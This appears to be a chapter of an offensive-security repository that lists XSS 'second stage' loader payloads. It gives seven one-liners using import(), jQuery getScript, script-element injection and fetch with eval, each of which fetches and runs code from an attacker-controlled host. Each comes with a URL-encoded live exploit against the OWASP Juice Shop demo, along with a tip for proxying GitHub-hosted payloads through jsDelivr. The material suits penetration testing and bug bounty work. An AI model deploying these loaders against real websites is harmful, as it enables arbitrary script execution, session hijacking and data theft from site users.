# Second Stage JavaScript Payload Loaders

<p align="justify">This chapter documents JavaScript payloads used to load and execute second stage payloads.</p>

<p align="justify">Although a lot of amazing online resources exist on the topic of XSS, none that i am aware of cover second stage payload loaders in more detail.</p>

In case the second stage payload is hosted on GitHub (`Content-Type: text/plain`) and the loader payload requires `Content-Type: application/javascript`, use the following endpoint to achieve this conversion:

* https://cdn.jsdelivr.net/gh/GITHUB_USERNAME/GITHUB_PROJECT_NAME/GITHUB_PROJECT_PATH/GITHUB_JS_FILE
    * e.g.
        * original: https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/basic/simplePoC/simpleStd.js
        * proxied: https://cdn.jsdelivr.net/gh/lighthouseitsecurity/weaponizedXSS/basic/simplePoC/simpleStd.js

* **NOTE**: this is not an exhaustive list - further payload options and options for modifying the payload exist
    * all payloads listed here are proven to work and have been battle-tested on Bug Bounty platforms
    * depending on the scenario, one may work over another
        * overall, in most scenarios, at least one of them works
            * if not, explore available options for "saying the same in a different way" (i.e. adapt to target environment)
            * if required, deal with Content Security Policy (CSP; not covered here)
    * list may be updated with additional payloads or different variants

## `import()` - round brackets; quote; `Access-Control-Allow-Origin` required

```
import('//ATTACKER_WS/PATH/JS_PAYLOAD');
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22import(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E

## [jQuery] `$.getScript()` - round brackets; quote; dollar

```
$.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22%24.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E

## [jQuery] `jQuery.getScript()` - round brackets; quote

```
jQuery.getScript('//ATTACKER_WS/PATH/JS_PAYLOAD');
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22jQuery.getScript(%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E

## `appendChild()` #1 - round brackets; quote; equal

```
with(document)body.appendChild(createElement('script')).src='//ATTACKER_WS/PATH/JS_PAYLOAD';
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3B%22%3E

## `appendChild()` #2 - round brackets; quote; equal; space

```
var js=document.createElement('script');js.type='text/javascript';js.src='//ATTACKER_WS/PATH/JS_PAYLOAD';document.body.appendChild(js);
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22var%20js%3Ddocument.createElement(%27script%27)%3Bjs.type%3D%27text/javascript%27%3Bjs.src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2Fbasic%2FsimplePoC%2FsimpleStd.js%27%3Bdocument.body.appendChild(js)%3B%22%3E

## `fetch()` #1 - round brackets; right angle bracket; quote; equal; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`

```
fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(r=>r.text().then(t=>eval(t)));
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch(%27%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js%27).then(r%3D%3Er.text().then(t%3D%3Eeval(t)))%3B%22%3E

## `fetch()` #2 - round brackets; curly brackets; quote; space; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`

```
fetch('//ATTACKER_WS/PATH/JS_PAYLOAD').then(function(r){return r.text().then(function(t){return eval(t);})});
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22fetch(%27%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js%27).then(function(r)%7Breturn%20r.text().then(function(t)%7Breturn%20eval(t);%7D)%7D)%3B%22%3E

## `fetch()` #3 - round brackets; curly brackets; quote; equal; space; `eval()`; `Access-Control-Allow-Origin` required; works with `Content-Type: text/plain`

```
async function g(f){o=await fetch(f);t=await o.text();eval(t);};g('//ATTACKER_WS/PATH/JS_PAYLOAD');
```

* *(live example - OWASP juice shop - reflected XSS)*

    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22async%20function%20g(f)%7Bo%3Dawait%20fetch(f);t%3Dawait%20o.text();eval(t);%7D;g(%27%2F%2Fraw.githubusercontent.com%2Flighthouseitsecurity%2FweaponizedXSS%2Frefs%2Fheads%2Fmain%2Fbasic%2FsimplePoC%2FsimpleStd.js%27)%3B%22%3E
